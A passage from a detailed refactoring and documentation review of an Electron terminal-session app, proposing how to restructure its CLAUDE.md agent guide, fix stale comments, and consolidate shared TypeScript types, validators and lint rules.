  sections are story-ordered. One subsystem is split across non-adjacent sections: terminals at
  60-79 and 294-304; settings at 500-511 and 513-521; windows at 81-117, 119-136, 138-147 and
  189-228. The operational basics are missing (DOC-3, DOC-4, DOC-5), and "The shape of it" is the
  only map.
- **What:** Adopt the layout in §2 and §3: a root file of about 130 lines, nested `CLAUDE.md` files
  in `src/main/`, `src/main/{pty,search,store,update,plugins,log}/`, `src/renderer/`,
  `src/renderer/state/`, `src/shared/theme/` and `tests/`, and `docs/architecture/` for the
  cross-cutting topics (windows and tabs, activity, session following, boundaries).
- **Why:** The long "why" prose only matters when you touch that code. Loaded up front, it pushes out
  task context and buries the handful of rules that apply everywhere.
- **Trade-offs:**
  - Nested files load automatically when Claude reads files in their directory. That makes them
    safer than linked docs, which an agent may never open.
  - Linked docs are needed for topics that span processes.
  - The insurance is the root "Hard rules" list. Each silent-failure invariant is stated in one line
    in root, so skipping the deep doc cannot break it.
  - Do **not** use `@path` imports to split the file. They are expanded eagerly and save nothing.
- **Gain:** About 75% less always-loaded context. Guidance appears when it is relevant. It is
  clearer where new lessons go: next to the code.
- **Implementation steps:**
  1. Create the files named in §2. Move the prose **verbatim** first. Edit in a second commit so the
     diff shows nothing was lost.
  2. Merge the split sections while moving: 60-79 with 294-304 in `pty/CLAUDE.md`, and 500-521 in
     `src/main/CLAUDE.md` §Settings.
  3. Fix the inaccuracies from DOC-2 in their new homes.
  4. Write the new root from the §3 outline. Each hard rule ends with the path of its home.
  5. Give each nested file a first line of the form "Read with root CLAUDE.md; this covers X", plus a
     "See also" footer that links the related `docs/architecture` file.
  6. Add `docs/architecture/README.md` listing every topic doc and nested CLAUDE.md.
  7. Run `npm run lint:md`. The nested files are covered by the `**/*.md` glob.
- **Verification:**
  - `wc -l CLAUDE.md` is at most 150.
  - Every sentence of the old file is findable: `git show HEAD~N:CLAUDE.md` split into sentences,
    each grepped across `**/CLAUDE.md docs/`. A 20-line script can do this.
  - A fresh Claude Code session asked "how do I add a setting?" answers from root without opening files.
  - Reading `src/main/pty/ptyManager.ts` loads `src/main/pty/CLAUDE.md` (check with `/memory`).
- **Constraints:** Delete no "why" prose. Keep the three security rules and the ABI table in root.
  The markdownlint config must still ignore `docs/history`.
- **Depends on:** DOC-2, DOC-3, DOC-4 and DOC-5 (their content lands in the new root).

#### DOC-2: Fix the stale or incorrect statements in CLAUDE.md and code comments

- **Severity:** medium
- **Effort:** S
- **Evidence:** Accuracy table rows 1-7, plus `ipc.ts:646-649`, `api.ts:110-111`, `api.ts:370-381`,
  `main/pty/promptPath.ts:21-24` and the plan-task references (`App.tsx:1105`, `useTree.ts:24,82`,
  `layoutReport.ts:25`).
- **What:**
  - Say "Three rules".
  - Replace "(the replay buffer fills them in)" with "(each view is caught up from `ptySnapshot`,
    see Windows)".
  - List `fakeApiary.ts` in the IPC sentence.
  - State what CI actually runs: typecheck, lint, `npm test` and `test:component`. e2e is local only,
    so "(2 on CI)" applies only if someone runs it on CI.
  - Change "bumped per release" to "bumped for every change".
  - Rewrite the `ipc.ts` comment to cite `screen()`.
  - Move the two misplaced JSDocs in `api.ts`.
  - Reword `promptPath.ts:21-24` to "not worth it *for the trim*; the Minimal prompt setting does use
    a shim, below".
  - Replace "Task N" with the behaviour it refers to.
- **Why:** An agent trusts CLAUDE.md over the code. The replay-buffer sentence invites someone to
  reintroduce the exact scrambling bug that `screenSnapshot.test.ts` guards against.
- **Gain:** The docs and in-code comments agree with the code.
- **Implementation steps:** Make the edits listed. Then add `/** A tab open somewhere … */` above
  `ActiveTabPayload` (`api.ts:150`), and move lines 370-381 to directly above
  `tabDropped` (`api.ts:391`).
- **Verification:**
  - `grep -n "replay buffer fills" CLAUDE.md` returns nothing.
  - `grep -n "replays up to 256KB" src/main/ipc.ts` returns nothing.
  - Hovering `tabDropped` in the IDE shows its doc.
  - `grep -rn "Task [0-9]" src` returns nothing.
- **Constraints:** Keep the wording style (why-first).
- **Depends on:** none. Do this first; it survives DOC-1.

#### DOC-3: Add a command quick-reference, including how to run a single test per layer

- **Severity:** high
- **Effort:** S
- **Evidence:**
  - CLAUDE.md never says how to run one unit, component or e2e file, or one test by name. The
    only place that does is a historical plan: `docs/superpowers/plans/2026-09-17-pane-layouts.md:17`
    ("A single e2e spec: `npm run test:e2e -- tests/e2e/<file>.spec.ts` (optionally `-g "<title>"`)").
  - `lint:fix`, `test:watch`, `build` and `test:e2e:smoke` get no command line of their own.
  - `APIARY_HEADED`, the `bench/` specs' run instructions and the cost of `test:e2e` (a rebuild
    plus a build on each invocation, per `package.json`) are also missing.
- **What:** Add the "Commands" block in §3 to root. It keeps the ABI table and adds a "single test"
  row per layer, the opt-in suites, and the fast inner loop. After one `npm run test:e2e`, the
  command `npx playwright test tests/e2e/x.spec.ts` is safe *only* if the ABI is Electron and `out/`
  is fresh. Say so explicitly, or keep the "always use npm run" rule.
- **Why:** Agents otherwise either run whole suites (e2e takes about 3 min and rebuilds natives) or
  call `npx vitest` directly and hit the ABI trap that CLAUDE.md warns about.
- **Gain:** Faster, correct inner loops, and fewer bogus "20 failing tests" reports.
- **Implementation steps:**
  1. Write the table.
  2. Check each command once by hand. The maintainer should do this; the reviewer was asked not to run tests.
- **Verification:** Each listed command runs as described on a clean checkout.
- **Constraints:** Keep "never run npm test and test:e2e concurrently" prominent.
- **Depends on:** none.

#### DOC-4: Add "How to add X" recipes

- **Severity:** medium
- **Effort:** S-M
- **Evidence:** Adding a setting today touches seven places. None of them is listed anywhere:
  - `AppSettings` (`main/settings.ts:21-85`)
  - `DEFAULT_SETTINGS` (`settings.ts:87`)
  - `AppSettingsPayload` (`shared/api.ts:24-64`)
  - the `settingsGet` mapping (`ipc.ts:211-234`)
  - the `settingsSet` merge with `keep()` (`ipc.ts:236-280`)
  - `SettingsDialog.tsx`
  - `tests/component/fakeApiary.ts`

  Changing a default additionally needs `SETTINGS_VERSION` and `migrateSettings`. Evidence of the
  full footprint: `grep -l terminalMinimalPrompt` hits 7 files. A new IPC call touches `api.ts`
  (CHANNELS + `ApiaryApi`), `preload/index.ts`, `ipc.ts` and `fakeApiary.ts`. A plugin icon must be
  added "in both places" (`main/plugins/types.ts:79`). A new effect needs `spec.ts` `EFFECT_KINDS`,
  `effects/index.ts` `EFFECTS`, and `prompt.ts` `EFFECT_NOTES` (the last is unenforced, see SHARED-4).
- **What:** A root section of 5-8 lines per recipe. Cover: IPC call, setting (+ migration), plugin
  (+ settings fields), theme token, theme effect, log line (use `redact`, pick a scope), component
  test (fake must mirror main's events), e2e spec (`launchApiary`, `@serial` if it uses the
  clipboard, focus or timing; `@smoke` for main paths).
- **Why:** These are the most common change types, and every one has a silent-failure step: the
  fake not emitting an event, a missing merge `keep()`, a default change without a migration.
- **Gain:** Changes arrive complete, which cuts review churn.
- **Implementation steps:**
  1. Write each recipe from the file list above.
  2. Validate each recipe against the last commit that did that thing. For example,
     `git log -S terminalMinimalPrompt --stat` for a setting.
- **Verification:** A dry run by an agent that adds a dummy setting following only the recipe passes
  typecheck and the component tests.
- **Constraints:** Recipes list files and invariants. They are not tutorials.
- **Depends on:** SHARED-2 shrinks the settings recipe if done first.

#### DOC-5: State the definition of done and the versioning, changelog and commit rules

- **Severity:** high
- **Effort:** S
- **Evidence:**
  - CLAUDE.md:605 says "bumped per release". But every commit in `git log` carries a version
    (`feat(sidebar): 1.25.0 — …`, `fix(test): 1.24.2 — …`, `chore(lint): 1.24.1 — …`).
  - The "new version and changelog section for every change" rule exists only in the maintainer's
    personal Claude memory, not in the repo.
  - The commit format `type(scope): X.Y.Z — summary` is not written down; `commitlint.config.js`
    only enforces `config-conventional`.
  - There is no DoD. CLAUDE.md never says which checks must pass before a change is finished.
- **What:** Add root sections "Definition of done" and "Versioning, changelog, commits" (text in §3).
  Include the Keep-a-Changelog categories in use (Added, Changed, Fixed) and the "(not released)" /
  "(Linux only)" annotation convention seen at `CHANGELOG.md:33,40`.
- **Why:** Any agent or contributor without that memory will produce unversioned commits, or reuse a
  version.
- **Gain:** A consistent history, and releases that match the changelog.
- **Implementation steps:**
  1. Write both sections.
  2. Mirror them in `CONTRIBUTING.md`.
  3. Optionally add a commitlint rule, or a pre-commit check, that `package.json` version appears in
     the staged `CHANGELOG.md`.
- **Verification:** A new agent session produces a commit with a bumped version and a changelog section.
- **Constraints:** "Ask before push, tag or release" stays.
- **Depends on:** none.

#### DOC-6: Document env vars, CLI flags and on-disk state

- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - Eight app env vars go unmentioned: `APIARY_CONFIG_ROOT`, `APIARY_DB_PATH`, `APIARY_GLAB_PATH`,
    `APIARY_CODE_PATH`, `APIARY_FAKE_LIVE`, `APIARY_HEADLESS`, `APIARY_FAKE_UPDATE_MODE` and
    `CLAUDE_CONFIG_DIR` (accuracy table footer).
  - The userData files are never listed together: `apiary.db` (`index.ts:390`), `settings.json`
    (392), `session-layout.json` (393), `prompt-shim/` (430), `themes.json` (457), `search.db` and
    logs. The "Measure before fixing" section tells you to read `apiary.db`/`search.db` but not
    where they are.
- **What:** Add a root table: name, set by (user, test harness, CI), effect. Add a second table of
  on-disk files with owner module. Point to `src/main/config.ts` for the Claude config root.
- **Why:** Debugging real state is the documented method ("Measure before fixing"). It needs to know
  where the state is.
- **Gain:** Faster diagnosis, and fewer test-harness surprises.
- **Implementation steps:**
  1. Take the list from `grep -rhoE "process\.env\.[A-Z_]+" src tests`.
  2. Take the paths from `index.ts:385-460`.
- **Verification:** The table rows match the grep output exactly.
- **Constraints:** Mark test-only vars as such.
- **Depends on:** none.

#### DOC-7: Add a feature-to-path map

- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - "The shape of it" (7-17) names only the four top directories.
  - Feature locations are scattered through the prose. There are 13 main subfolders and 15 flat main
    files, and `renderer/components` has 43 flat files (`git ls-files`).
- **What:** A table in root. Columns: feature, main, shared, renderer, tests (unit/component/e2e).
  Example row: "Themes: `main/theme/*`, `shared/theme/*`, `renderer/theme/*` +
  `components/ThemesSection.tsx`; tests: `unit/theme*`, `component/themes`, `e2e/themes`,
  `e2e/themeGenerator`, `e2e/bench/themePerf`".
- **Why:** The component and e2e test files are named by feature and mirror each other (for example
  `sidebar.test.tsx` and `sidebar.spec.ts`). The map makes that pairing explicit.
- **Gain:** Agents find the right files on the first try.
- **Implementation steps:** Build the table from `git ls-files`. About 14 rows.
- **Verification:** Every path in the table exists. The DOC-12 check automates this.
- **Constraints:** Keep it at directory or file level. No line numbers.
- **Depends on:** STRUCT-4 and STRUCT-5, if done later (update the map in the same commit).

#### DOC-8: Index docs/superpowers and move it, with test-suite-proposal.md, into docs/history

**Lead review:** Option B (index in place) is recommended, because the maintainer uses superpowers skills that write to `docs/superpowers/`. §3.2 reflects option B.

- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `wc -l docs/superpowers/*/*.md` totals 16,503 lines in 13 plans and 5 specs.
  - Nothing links to them from CLAUDE.md or README.
  - The plans embed "Global Constraints" that go stale. For example, `plans/2026-09-17-pane-layouts.md:18`
    names a "known pre-existing flake" at `settings.spec.ts:83`, and line 26 says "Release version
    for this feature: **1.17.0**".
  - `docs/test-suite-proposal.md:6` "Status: implemented (branch `fix/test-suite`)" is a closed
    record that sits beside user docs, and nothing references it (`grep` returns nothing).
  - Only 5 intra-folder links reference `docs/superpowers` (one per plan, each pointing to its spec).
- **What:**
  - Keep the files; they are the record of intent.
  - Move them to `docs/history/{specs,plans}/` and `docs/history/test-suite-proposal.md`.
  - Add `docs/history/README.md` with a table: date, feature, version shipped, spec and plan links,
    status. Open it with a banner: "Historical. Where these disagree with the code or CLAUDE.md, the
    code wins. Do not treat 'Global Constraints' as current rules."
  - Add one root line that says the same.
- **Why:** An agent that greps for a symbol will hit these 16k lines. Without a banner it may follow
  obsolete constraints.
- **Gain:** The history is kept and labelled, so it no longer misleads.
- **Implementation steps:**
  1. `git mv docs/superpowers docs/history` and `git mv docs/test-suite-proposal.md docs/history/`.
  2. `sed` the 5 intra-doc links (`docs/superpowers/` becomes `docs/history/`).
  3. Update `.markdownlint-cli2.jsonc` `ignores`.
  4. Write the README index.
  5. The superpowers skills write to `docs/superpowers/` by default, so either leave a
     `docs/superpowers/README.md` stub that says "new plans go here, then move to history after
     release", or keep the folder name and only add the index. **Option B (index in place) is the
     cheaper, equally good choice if the maintainer keeps using superpowers.**
- **Verification:** `npm run lint:md` passes. `grep -rn "docs/superpowers" docs` finds only the stub.
- **Constraints:** Don't rewrite the history files.
- **Depends on:** none.

#### DOC-9: Add CONTRIBUTING.md, trim the README's developer and packaging internals, add LICENSE and .nvmrc

- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - There is no CONTRIBUTING, ARCHITECTURE or LICENSE file in `git ls-files`, although `package.json`
    says `"license": "MIT"`.
  - The repo is public. `docs/install-prompt.md` step 3 uses the unauthenticated GitHub API.
  - README "Development" (130-137) omits `lint`, `test:component` and `test:e2e:smoke`.
  - README "Packaging" (171-261) is about 90 lines of maintainer internals in the user README
    (distutils, a cross-arch story, CI verification notes). It includes the stale artifact name
    `release/Apiary-1.0.0-arm64.dmg` (216).
  - README "Requirements: Node 22 or newer" (126) reads as a user requirement, but prebuilt installs
    don't need Node. `install-prompt.md:51` says "needs Node.js 22+ … either way".
  - There is no `.nvmrc`, although `engines.node >=22` and `ci.yml` pin 22.
- **What:**
  - `CONTRIBUTING.md` for humans: setup, the ABI trap, commands, DoD, commit and version rules,
    release steps, links to `docs/architecture`.
  - Move README Packaging into `docs/packaging.md`.
  - Split README Requirements into "to run" and "to build".
  - Add an MIT `LICENSE`.
  - Add `.nvmrc` containing `22`.
- **Why:** Humans have no onboarding path except CLAUDE.md, which is written for agents. The user
  README carries build lore.
- **Gain:** A cleaner README for users, a real contributor guide, and legal clarity.
- **Implementation steps:** As listed. Keep the README's `docs/install-prompt.md` and
  `docs/screenshot.png` paths unchanged, because external links use them.
- **Verification:** `npm run lint:md`, and README links resolve.
- **Constraints:** The install prompt must stay a paste-only file (it is in markdownlint's ignore list).
- **Depends on:** DOC-5.

#### DOC-10: Record the architecture decisions as ADRs, lightly

- **Severity:** low
- **Effort:** M
- **Evidence:** CLAUDE.md already writes ADR-shaped prose: decision, rejected alternative,
  consequence. Examples:
  - `backdrop-filter` rejected after measuring about 800 ms lag (256-261)
  - search in a worker (359-367)
  - `glab` instead of an API token (492-498)
  - layout presets instead of a split tree (322-325)
  - `PROMPT_DIRTRIM` instead of PS1 (62-65)
  - the unsigned-mac assisted update (572-581)
  - no tests in git hooks (460-461)
  - effects-in-a-worker "tried and measured slower" (268-269)
- **What:**
  - Create `docs/adr/` with a 10-line template: Context / Decision / Alternatives tried / Consequences / Status.
  - Extract about 10 ADRs, only for decisions where an alternative was **tried and rejected**. That is
    the content most at risk of being "helpfully" re-proposed.
  - The nested CLAUDE.md files and topic docs keep a one-sentence summary plus the ADR link.
  - New decisions get an ADR in the same PR.
- **Why:** Topic docs describe the current state. ADRs keep the record of rejected paths without
  bloating the living docs.
- **Trade-off:** A full conversion is not worth it. Most CLAUDE.md prose is "how it works", which
  belongs in topic docs.
- **Gain:** Stable IDs to cite in reviews ("see ADR-0005"), and a smaller surface in the living docs.
- **Implementation steps:**
  1. Add the template.
  2. Write ADR-0001 through ADR-0010 from the passages listed.
  3. Link them from their topic homes.
- **Verification:** Each ADR is linked from exactly one topic doc or nested CLAUDE.md.
- **Constraints:** Don't duplicate full prose. Choose ADR or topic doc for each passage, not both.
- **Depends on:** DOC-1.

#### DOC-11: Stop the docs drifting (CI check that documented paths exist)

- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - This review found drift only by grepping every backticked path by hand (§1).
  - `markdownlint` checks structure, not references.
  - Two "stale" items above (rows 3 and 4) would never have been caught by lint.
- **What:** Add `scripts/check-doc-refs.mjs`. It extracts backticked tokens from `**/CLAUDE.md`,
  `docs/architecture/**` and `CONTRIBUTING.md` that look like repo paths (containing `/` or ending
  `.ts`, `.tsx`, `.mjs`, `.yml`, `.json` or `.sh`), and fails if a path does not exist. Bare filenames
  must match a unique path. Wire it into `lint:md`.
- **Why:** The docs are the project's memory. A renamed file silently orphans the paragraph about it.
- **Gain:** Renames break the build instead of the docs.
- **Implementation steps:**
  1. Reuse the extraction regex from this review:
     `` `[^`]*(/|\.)(ts|tsx|mjs|cjs|js|json|yml|css|md|sh)` ``.
  2. Allowlist runtime paths such as `<config>/sessions/<pid>.json`, `settings.json` and
     `latest-*.yml`.
  3. Run it in `lint`.
- **Verification:** Renaming `src/main/windowAtPoint.ts` locally makes `npm run lint` fail.
- **Constraints:** It must be fast (under 1 s) and have no dependencies.
- **Depends on:** DOC-1 (point it at the final file set).

#### SHARED-1: Split src/shared/api.ts and types.ts by domain

- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - `api.ts` (526 lines) mixes 13 payload types (settings, log, update, plugin, theme, active tab,
    pty session and snapshot), the `CHANNELS` map (100 entries, not grouped: `mrStatusesInvalidated`
    sits between `ptySessions` and `ptySessionsChanged` at 204-206), the `ApiaryApi` interface, and a
    global `Window` augmentation (524-526).
  - `types.ts` (263 lines) mixes session and tree types, git, transcript, tab transfer, persisted
    layout plus validators, and `UNTITLED_SESSION`.
  - The placement is arbitrary. `NewSessionInfo` and `ResumeConflict` are in `types.ts`, while
    `PtySessionInfo` and `PtySnapshot` are in `api.ts`. Theme state types (`SavedTheme`,
    `ThemeState`, `ThemeOptions`) are in `api.ts`, not `shared/theme/`.
  - The "Payload" suffix is inconsistent: `AppSettingsPayload` vs `SavedTheme`, `ThemeState` and
    `DiscoveredSession`.
- **What:** Group by domain, as in §4:
  - `shared/ipc/{channels.ts, api.ts}`
  - `shared/domain/{session.ts, git.ts, tabs.ts, settings.ts, update.ts, plugins.ts}`
  - `shared/theme/state.ts`

  Group `CHANNELS` keys by domain with section comments. Pick one suffix rule: `…Payload` only for
  types that exist solely as a wire shape.
- **Why:** 69 files import `shared/types` or `shared/api` (46 + 23). Every new feature appends to
  one of two grab-bags, so neither file has a clear owner.
- **Gain:** Discoverability. Domain types become importable by main without pulling in the whole
  bridge (see SHARED-2).
- **Implementation steps:**
  1. Create the new files and move the declarations verbatim.
  2. Turn `types.ts` and `api.ts` into `export *` barrels so nothing breaks.
  3. Codemod the imports per domain in small commits.
  4. Delete the barrels last.
  5. Move `declare global { interface Window { apiary: ApiaryApi } }` into
     `src/renderer/env.d.ts`, with preload importing the type.
- **Verification:** `npm run typecheck && npm run lint`, then
  `grep -rn "from '@shared/types'\|from '@shared/api'" src tests` returns nothing at the end.
- **Constraints:**
  - Channel string values must not change (`'apiary:…'`).
  - Keep `fakeApiary.ts` typed as `ApiaryApi`.
  - Do not name a folder `main` or `renderer` (ESLint pattern trap, §4).
- **Depends on:** Coordinate with the main and renderer reviewers' refactors.

#### SHARED-2: Define each cross-process type once, in shared; main imports it

**Lead review:** Same work as MAIN-22; implement together.

- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - `UpdateStatusPayload` (`api.ts:74-92`) is a hand-written copy of `UpdateStatus` +
    `UpdatePhase` + `Capability` + `InstallInstructions` + `OpenInstallerResult`
    (`main/update/updateService.ts:23-60`, `capability.ts:23-52`). Its comment explains why: "kept
    structural to avoid the renderer importing main-process code".
  - `PluginBarItemPayload` (`api.ts:160-168`) copies `PluginBarItem`, `PluginIcon` and
    `PluginAction` (`main/plugins/types.ts:79-113`). That file says "Adding one means adding it in
    both places."
  - `PluginSettingFieldPayload` (`api.ts:95-98`) copies `PluginSettingField` (`plugins/types.ts:33`).
  - `AppSettings` (`main/settings.ts:21-85`) repeats all 20 fields of `AppSettingsPayload`, plus 3 more.
  - `MrState` is defined three times: `main/git/mrStatusCache.ts:7`,
    `renderer/components/mrRefText.tsx:4`, and inline at `api.ts:453`.
  - `OpenTab` (`tabRegistry.ts:5-15`) versus the inline type in `ApiaryApi.reportTabs` (`api.ts:318`).
  - `ThemeOptions.model: string` (`api.ts:128`), while `THEME_MODELS` lives in main
    (`themeGenerator.ts:12`) and the renderer hard-codes the same list (`ThemesSection.tsx:22-24`).
- **What:**
  - The direction main → shared is allowed (`eslint.config.js:76` only forbids main → renderer).
    Move the canonical type definitions into shared and have main import them. For example,
    `shared/domain/update.ts` exports `UpdatePhase`, `UpdateStatus`, and the rest; main's
    `updateService.ts` imports them.
  - `AppSettings extends AppSettingsPayload { schemaVersion; updateSkippedVersion; windowBounds }`.
  - Move `THEME_MODELS` and `type ThemeModel` to `shared/theme/`, and type `ThemeOptions.model` as `ThemeModel`.
  - `MrState` goes in `shared/domain/git.ts`.
- **Why:** Structural assignability at `ipc.ts:462-482` catches some drift, but not a union member
  added on the shared side only. And every change costs two edits.
- **Gain:** One edit per change. The DOC-4 recipes get shorter.
- **Implementation steps:**
  1. For each pair: move the richer (main) definition, with its doc comments, to shared.
  2. Replace the other copy with an import or re-export.
  3. Delete the "Mirrors …" comments.
  4. Run typecheck.
- **Verification:**
  - `grep -rn "'opened' | 'merged'" src` gives 1 hit.
  - `grep -n "Mirrors" src/shared/api.ts` gives 0.
  - `grep -rn "'sonnet'" src/renderer` gives 0 outside labels driven by the shared list.
- **Constraints:** Shared stays free of Node and Electron. The update types are pure data, so this is fine.
- **Depends on:** SHARED-1 (the target files).

#### SHARED-3: Name the magic strings shared by both processes (pty ids, tab view, theme prefixes, log scopes)

**Lead review:** The pty-id part is merged into MAIN-21. Implement `TabView`, `BUILTIN_THEME_PREFIX` and `LogScope` here.

- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - The pty id formats are built independently on both sides. `shell:<key>:<n>` appears at
    `appService.ts:687,706` and at `SessionColumn.tsx:252,351,720,725`. `new:<uuid>` is built at
    `appService.ts:939,960` and parsed at `App.tsx:455`. `App.tsx:251` and `columns.ts:9` document
    the format in prose.
  - `'transcript' | 'terminal'` is repeated 10 times in 7 files (`grep` count: `shared/types.ts`
    ×2, `api.ts` ×2, `layoutReport.ts`, `tabRegistry.ts`, `ipc.ts`, `columns.ts`, `ResumeBar.tsx` ×2).
  - The `'builtin:'` prefix appears in `themeStore.ts:25`, `themeIpc.ts:48` and `builtins.ts:8`.
  - The log scope is a free `string` (`logger.ts:134-159`), with about 20 distinct scopes in use.
    CLAUDE.md:547-550 lists some of them as the contract.
- **What:** Add `shared/domain/tabs.ts` (or `ptyIds.ts`) with:
  - `type TabView = 'transcript' | 'terminal'`
  - `shellPtyId(key, n)`
  - `newPtyId(uuid)`
  - `isPendingPtyId(id)`

  Use them on both sides. Add `BUILTIN_THEME_PREFIX` in `shared/theme/builtins.ts`. Add a
  `LogScope` union in shared, used by `logger.ts` and by `logWrite` in `api.ts:389`.
- **Why:** The id format is a cross-process protocol. A change on one side silently orphans shells.
  That is the class of bug CLAUDE.md:95-98 describes, where a shell killed a build.
- **Gain:** A compiler-checked protocol, and one place to document it.
- **Implementation steps:**
  1. Add the helpers with unit tests.
  2. Replace the literals.
  3. `grep -rn "\`shell:\|\`new:\|'new:'" src` returns only the helper file.
- **Verification:** That grep, then typecheck, `npm test`, and `test:component`.
- **Constraints:** The id strings must stay byte-identical, because `session-layout.json` on users'
  disks contains them.
- **Depends on:** SHARED-1.

#### SHARED-4: Make the theme generator's per-effect and per-font notes exhaustive

- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `shared/theme/prompt.ts:15` `const EFFECT_NOTES: Record<string, string>` and `:29`
    `FONT_NOTES: Record<string, string>`.
  - A new entry in `EFFECT_KINDS`/`UI_FONTS`/`MONO_FONTS` (`spec.ts:33-41`) compiles without a note.
  - Meanwhile `spec.ts:5-7` claims "adding an entry is how a new colour, font or effect becomes
    available — nothing else is needed". A canvas effect actually also needs an `EFFECTS` entry.
    That one *is* enforced by `Record<Exclude<EffectKind,'neon-glow'>, Effect>` at `effects/index.ts:15`.
- **What:** Type the notes as `Record<EffectKind, string>` and `Record<UiFont | MonoFont, string>`.
  Correct the `spec.ts` header to list the three places.
- **Why:** Claude would be offered an undescribed effect, and the generator's output quality
  depends on those notes.
- **Gain:** The compiler enforces completeness.
- **Implementation steps:** Change the two annotations and import the types. Then edit the header comment.
- **Verification:** Temporarily adding `'foo'` to `EFFECT_KINDS` makes typecheck fail in `prompt.ts`
  and `effects/index.ts`.
- **Constraints:** No behaviour change.
- **Depends on:** none.

#### SHARED-5: Enforce shared purity against Node (lint), and move the Window augmentation out

- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - The ESLint shared block (`eslint.config.js:111-119`) forbids `electron`, `**/main/**` and
    `**/renderer/**`, but **not `node:*`**, and has no `no-restricted-globals`.
  - `@types/node` is part of both tsconfig programs. `npx tsc -p tsconfig.json --listFilesOnly`
    lists 83 `@types/node` files, pulled in transitively through the `vitest/globals` and
    Playwright types. So `import { readFileSync } from 'node:fs'` or `process.env.X` in `src/shared`
    would pass both typecheck and lint, then crash the renderer at runtime.
  - DOM usage *is* caught, because `tsconfig.node.json` has no DOM lib.
  - Today's code is clean: a grep for `window.`, `document.`, `process.`, `Buffer`, `node:` and
    `require(` in `src/shared` finds only comments.
  - `api.ts:524-526` `declare global { interface Window … }` is a DOM-side augmentation that lives
    in shared, so it is also declared in the main project.
- **What:**
  - Add `{ group: ['node:*'], message: 'Shared code runs in the renderer too' }` to the shared block's patterns.
  - Add `'no-restricted-globals': ['error', 'process', 'Buffer', 'window', 'document', 'require', '__dirname']`.
  - Move the `Window` augmentation to `src/renderer/env.d.ts`.
  - Consider the same globals rule for `src/renderer` (`process`, `Buffer`); that one is the renderer reviewer's call.
- **Why:** CLAUDE.md:410-413 states the rule. Only half of it is machine-checked.
- **Gain:** The purity guarantee becomes real.
- **Implementation steps:** Edit `eslint.config.js`. Then add a throwaway `import 'node:fs'` in a
  shared file to confirm `npm run lint:js` fails.
- **Verification:** That negative test fails as expected. Then `npm run lint` is clean on the real code.
- **Constraints:** `src/shared/theme/effects/types.ts` deliberately declares `Ctx2D` instead of
  using DOM types. Keep that.
- **Depends on:** none.

#### SHARED-6: Remove the dead export and let tooling find the rest

- **Severity:** low
- **Effort:** S
- **Evidence:** I grepped each export in `src/shared/**` against `src/` and `tests/`.
  - **Truly unused:** `TreeNode` (`types.ts:78`). It has zero references anywhere, apart from its
    own definition.
  - **Exported but used only in their own file.** This is acceptable where they name part of a
    public signature:
    - `DEFAULT_SHAPE` and `termVar` (`spec.ts`, `cssVars.ts:17`)
    - `Density`, `MaterialKind`, `UiFont`, `MonoFont` (`spec.ts`)
    - `DrawFn` and `EffectParams` (`effects/types.ts`)
    - `MrRef` (`mrRefs.ts`), `RedactOptions` (`redact.ts`)
    - `MatchTier` and `RankedSession` (`sessionRank.ts`)
    - `PersistedPane` and `PersistedTab` (`types.ts`)
  - **Used only by tests:** `LayoutLike` (`layoutReport.ts`), `MAX_REQUEST_CHARS` (`prompt.ts:100`;
    used in-file and in `themePrompt.test.ts`), and `buildPersistedLayout`. The last is used only by
    the renderer (`App.tsx:1067`) and a test, even though its comment (`layoutReport.ts:25-28`)
    justifies the shared location with "a later task" in main that never arrived.
- **What:**
  - Delete `TreeNode`.
  - Either move `layoutReport.ts` to `renderer/state/`, or keep it and delete the speculative
    justification. Unit tests may import pure renderer state, and 10 already do (see STRUCT-6).
  - Optionally add `knip` (or `ts-prune`) as a non-blocking `npm run lint:dead` to catch future dead exports.
- **Why:** Dead and speculative exports make shared look larger and more coupled than it is.
- **Gain:** A smaller, honest shared surface.
- **Implementation steps:** Delete the export, run typecheck, and update the `layoutReport.ts`
  comment or location.
- **Verification:** `grep -rnw TreeNode src tests` is empty, and typecheck passes.
- **Constraints:** Keep type exports that appear in exported signatures.
- **Depends on:** none.

#### SHARED-7: De-duplicate the tab and layout validators, and test the URL validator

- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `isTabTransfer` (`types.ts:174-185`) and `isPersistedTab` (`types.ts:220-230`) repeat the same
    `shells` and `activeShell` checks line for line.
  - `PersistedTab` (187-194) is `TabTransfer` minus `ptyId`, spelled out by hand.
  - `isWindowLayoutReport` (246-255) validates untrusted `?restore=` URL input (`uiState.ts:141`),
    but no test references it (`grep -rl isWindowLayoutReport tests` returns nothing).
  - `clampSegments` (`promptPath.ts:26`) is also untested directly.
- **What:**
  - `type PersistedTab = Omit<TabTransfer, 'ptyId'>`.
  - Extract `isShellList(v)` and reuse it.
  - Add unit tests for `isWindowLayoutReport` (malformed panes, wrong types, extra fields) and for `clampSegments`.
- **Why:** These are trust-boundary validators. Duplicated checks drift apart.
- **Gain:** One definition, and tests for it.
- **Implementation steps:** Refactor, then add a `tests/unit/windowLayoutReport.test.ts` modelled on
  `tabTransfer.test.ts`.
- **Verification:** `npm test`.
- **Constraints:** The accepted shapes must not change, because stored `session-layout.json` files
  must still validate.
- **Depends on:** none.

#### SHARED-8: Small theme/ factoring and naming fixes

- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `theme/` is well factored overall: `spec` holds allowlists, `validate` is the boundary, `color`
    is pure maths, `cssVars` handles output, `prompt` builds the generator schema from the same
    allowlists, and `effects/` holds pure draw functions with an exhaustive registry.
  - However, `validate.ts` (351 lines) combines validation (1-145) with the readability engine:
    `PALETTE_CONTRAST`, `UNDERLAYS`, `backdrops`, `looks` and `ensureReadable` (147-303).
  - The theme state types sit in `api.ts:112-148` (SHARED-1).
  - Two modules are named `promptPath.ts`, one in `shared/` and one in `main/pty/`. They have
    different contents, which confuses search and imports. The shared one only holds
    `previewPrompt` + `clampSegments`.
- **What:**
  - Split `theme/readability.ts` out of `validate.ts`, exporting `ensureReadable` for `validate.ts` only.
  - Move the theme state types to `theme/state.ts`.
  - Rename `shared/promptPath.ts` to `shared/promptPreview.ts`.
- **Why:** Security review of the validator is easier when the boundary code is short. Unique
  filenames make search unambiguous.
